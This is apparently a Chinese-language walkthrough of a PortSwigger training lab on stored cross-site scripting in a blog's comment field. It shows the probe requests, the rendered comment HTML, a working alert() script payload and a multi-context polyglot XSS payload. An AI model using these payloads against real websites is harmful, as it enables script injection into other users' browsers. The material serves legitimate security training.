# 将 XSS 漏洞存储到 HTML 上下文中，但未进行任何编码。

https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

本实验室的评论功能中存在存储型跨站脚本漏洞。

要完成此实验，请提交一条评论，该评论会在博客文章被查看时调用 alert 函数。

## 步骤

探测
- 访问博客文章
    ```http
    GET /post?postId=2 HTTP/2
    ```

- 使用提交评论功能
    ```http
    POST /post/comment HTTP/2

    csrf=0ZHANuWEV5gDzNxeTRgBGHAYMw5E1wkT&postId=2&comment=testaaaaaa&name=bbbbbbbbbbbb&email=cccccccccccccc%40ccccccccc&website=http%3A%2F%2Fdddddddddddddd
    ```

- 渲染评论的上下文

    ```html
    <section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">
        <a id="author" href="http://dddddddddddddd">
        bbbbbbbbbbbb
        </a>
        | 13 July 2026
    </p>
    <p>
        testaaaaaa
    </p>
    <p>
    </p>
    </section>
    ```
    - 回显位置为
        - comment 
            `<p>` 标签
        - name
            `<a>` 标签
        - website
            `<a href="http:">` 标签链接属性，限制 `http:` 开头

攻击
- 在几个字段输入 `alert` 载荷测试后，得到
    ```html
    <section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">
        <a id="author" href="http:&quot; &gt;onerror=&quot;alert()">
        &lt;script&gt;alert()&lt;/script&gt;
        </a>
        | 13 July 2026
    </p>
    <p>
        testaaaaaa<script>
        alert()
        </script>
    </p>
    <p>
    </p>
    </section>
    ```
    - 除 comment 字段的字符被解析为代码外，其余字段对特殊字符进行了转义

- 或者，使用多上下文模糊测试载荷
    ```
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
    ```

    - 得到

        ```html
        <p>
            jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert() )//%0D%0A%0d%0a//
        </stYle/</titLe/</teXtarEa/</scRipt/--!>
        \x3csVg/<sVg/oNloAd=alert()//>\x3e`
        </p>
        ```
